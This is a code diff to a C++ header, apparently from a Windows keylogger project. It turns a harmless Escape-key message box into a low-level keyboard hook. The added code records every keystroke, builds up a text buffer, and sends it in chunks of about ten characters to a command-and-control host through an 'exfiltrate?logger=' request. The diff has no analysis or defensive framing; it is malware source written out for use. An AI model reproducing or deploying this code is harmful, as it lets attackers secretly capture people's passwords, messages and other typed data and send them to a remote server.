@@ -2,16 +2,40 @@
 #define KEYBOARD_HOOK_H
 #pragma once
 #include <Windows.h>
+#include "Keys.h"
+#include "C2.h"
 
+C2 c2;
+UTIL util;
 HHOOK hook;
+string logtext="";
 
 LRESULT KeyboardHookProc(int code, WPARAM wParam, LPARAM lParam) {
 	KBDLLHOOKSTRUCT kbdStruct;
 	if (code >= 0) {
 		if (wParam == WM_KEYDOWN) {
 			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
-			if (kbdStruct.vkCode == VK_ESCAPE) {
-				MessageBox(NULL, "Escape Pressed", "Key Pressed", NULL);
+
+			string key = Keys::TABLE[kbdStruct.vkCode];
+			if (key == "") {
+				key = "?";
+			}
+
+			if (kbdStruct.vkCode == VK_RETURN) {
+				logtext += "\n";
+			}
+
+			if (kbdStruct.vkCode == VK_SPACE) {
+				logtext += " ";
+			}
+
+			logtext += key;
+			
+			if (logtext.size() > 10) {
+				string pathName = "exfiltrate?logger=" + logtext;
+
+				c2.netsend(util.getC2Host(), pathName.c_str());
+				logtext = "";
 			}
 		}
 	}
